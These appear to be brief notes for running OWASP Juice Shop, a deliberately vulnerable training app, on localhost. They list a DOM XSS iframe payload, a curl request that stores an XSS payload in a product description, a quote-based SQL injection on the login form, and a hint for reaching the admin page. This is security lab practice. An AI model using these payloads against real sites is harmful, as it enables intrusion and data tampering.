# Juice Shop

## Running

```sh
nx start juice-shop
```

## XSS

### DOM XSS

Place this in search bar

```sh
<iframe src="javascript:alert(`xss`)">
```

Alternatively via <http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E>

### Persisted API XSS

Run this request

```sh
curl -X PUT http://localhost:3000/api/products/6 \
    -H "Content-Type: application/json" \
    -d '{"description":"<iframe src=\"javascript:alert(`xss!!!`)\">"}'
```

## SQL Injection

Place ' in login to terminate the string. No Prepared statements used.

## Miscellaneous

-   Privacy policy at <http://localhost:3000/#/privacy-security/privacy-policy>
-   Scoreboard at <http://localhost:3000/#/score-board>
-   Administration at <http://localhost:3000/#/administration> (see jwt.js to get access)
